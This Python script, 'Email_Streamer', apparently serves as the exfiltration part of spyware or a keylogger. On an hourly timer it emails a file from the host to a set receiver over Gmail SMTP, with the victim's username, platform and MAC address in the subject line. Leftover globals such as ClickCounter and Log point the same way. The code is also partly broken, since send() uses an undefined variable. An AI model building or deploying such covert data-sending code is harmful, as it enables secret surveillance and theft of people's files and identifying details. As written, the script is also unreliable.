
# ################

# Email_Streamer By Sajjad alDalwachee

# ################

import sys
import uuid
import socket
import smtplib
from time import *
from getpass import getuser
import email, smtplib, ssl
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

def MACaddress():
  mac = hex(uuid.getnode()).replace('0x', '').upper()
  mac = '-'.join(mac[i: i + 2] for i in range(0, 11, 2))
  return mac


# ################ Globals

server = "www.google.com" #Just For Test If There Are Internet
SMTPserver = "smtp.gmail.com" #SMTP Server For Gmail If You Use Another One Change It
ClickCounter = 0
Delete = list()
Text = list()
Log = list()

interval = 3600 #Interval Wait Before Send Email In Sec. 3600s == 1h


# ################ Timer

try:
    TimeFile = open('time.txt', 'r')
    Time = float(TimeFile.read())
except Exception as e:
    TimeFile = open('time.txt', 'w+')
    Time = int(time() + interval)
    TimeFile.write(str(Time))
    TimeFile.close()

# ################ Email Information

email = '' #Your Email Address
password = '' #Your Password
receiver = '' #Receiver Email Address
subject = '[{0}] - [{1}] - [{2}]'.format(getuser(), sys.platform, MACaddress())
emailBody = '' #Text You Need To Send


def connected(self):
  try:
    ip = socket.gethostbyname(self)
    return True
  except:
    pass
    return False

def email_server(email, password, resever, emailBody):
    global SMTPserver
    message = MIMEMultipart()


    file = ''  # Path To Your File That You Need To Send

    with open(file, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header(
        "Content-Disposition",
        f"attachment; filename= {file}",
    )
    message.attach(part)
    message['From'] = email
    message['To'] = resever
    message['Subject'] = subject
    message.attach(MIMEText(emailBody, 'plain'))
    server = smtplib.SMTP(SMTPserver, 587)
    server.starttls()
    server.login(email, password)
    emailBody = message.as_string()
    server.sendmail(email, resever, emailBody)
    server.quit()


def send():
    email_server(email, password, resever, emailBody)

if int(time()) >= Time:
    print(Time)
    while True:
        if connected(server):
            send()
            TimeFile = open('time.txt', 'w+')
            Time = int(time() + interval)
            TimeFile.write(str(Time))
            TimeFile.close()
            print(Time)
            break
